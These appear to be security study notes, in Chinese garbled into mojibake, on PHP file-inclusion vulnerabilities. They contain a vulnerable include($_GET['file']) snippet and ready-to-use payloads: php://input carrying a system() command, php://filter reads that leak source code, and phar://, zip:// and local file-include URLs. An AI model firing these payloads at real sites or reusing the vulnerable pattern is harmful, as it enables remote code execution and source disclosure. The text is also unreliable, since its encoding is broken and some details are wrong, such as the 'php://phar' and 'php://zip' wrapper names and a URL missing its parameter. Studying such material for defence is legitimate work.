# æ–‡ä»¶åŒ…å«æ¼æ´

<aside>
ğŸ’¡ å¼€å‘è€…å°†è¢«åŒ…å«æ–‡ä»¶è®¾ä¸ºå˜é‡ï¼Œç”¨äºåŠ¨æ€è°ƒç”¨ï¼Œå¯¼è‡´è°ƒç”¨æ¶æ„æ–‡ä»¶æˆ–è®¿é—®åè®®ï¼Œé€ æˆæ¼æ´

</aside>

1. å®ç°åŸç†
    - æœåŠ¡ç«¯php.infoé…ç½®ä¸¤å‚æ•°å¼€å¯
    
    ```toml
    allow_url_fopen=onallow _url_include=on
    ```
    
    - PHPæ–‡ä»¶ä¸­å­˜åœ¨å¯¹æ–‡ä»¶çš„åŠ¨æ€åŒ…å«
    
    ```php
    <?php
    	$file=$_GET['file'];
    	include $file;
    ?>
    ```
    
2. æ”»å‡»æ–¹å¼
    - ä¼ªåè®®æ”»å‡»
        - `php://input` `â‰¤5.3.0`
            
            <aside>
            ğŸ’¡ é…ç½®æ— éœ€å¼€å¯allow_url_include
            
            </aside>
            
            ```jsx
            URL index.php?php://input
            ```
            
            ```jsx
            POST <?php system('whoami');?>
            ```
            
        - `php://filter`
            
            <aside>
            ğŸ’¡ æŸ¥çœ‹æ–‡ä»¶ï¼Œä»¥Base64çš„ç¼–ç æ‰“å¼€
            
            </aside>
            
            ```jsx
            URL index.php?file=php://filter/read=convert.base64-encode/resource=index.php
            ```
            
            ```jsx
            URL index.php?file=php://filter/convert.base64-encode/resource=index.php
            ```
            
        - `php://phar` `â‰¥5.3.0`
            
            <aside>
            ğŸ’¡ è§£æå‹ç¼©æ–‡ä»¶é‡Œé¢çš„æ–‡ä»¶å†…å®¹ï¼Œä½œä¸ºè„šæœ¬æ‰§è¡Œï¼Œç›¸å¯¹è·¯å¾„ï¼Œç»å¯¹è·¯å¾„ä¸é™
            
            </aside>
            
            ```jsx
            URL index.php?file=phar://test.zip/target.txt
            ```
            
            ```jsx
            URL index.php?file=phar://D:/phpstudy/www/..../test.zip/target.txt
            ```
            
        - `php://zip` `â‰¥5.2.0`
            
            <aside>
            ğŸ’¡ è§£æå‹ç¼©æ–‡ä»¶å†…çš„æ–‡ä»¶å†…å®¹ï¼Œåªå…è®¸ç»å¯¹è·¯å¾„
            
            </aside>
            
            ```jsx
            URL index.php?file=zip://D:/phpstudy/www/.../test.zip/target.txt
            ```
            
    - æœåŠ¡ç«¯æ–‡ä»¶åŒ…å«æ”»å‡»
        
        ```jsx
        URL http://.../index.php?file=target.txt
        ```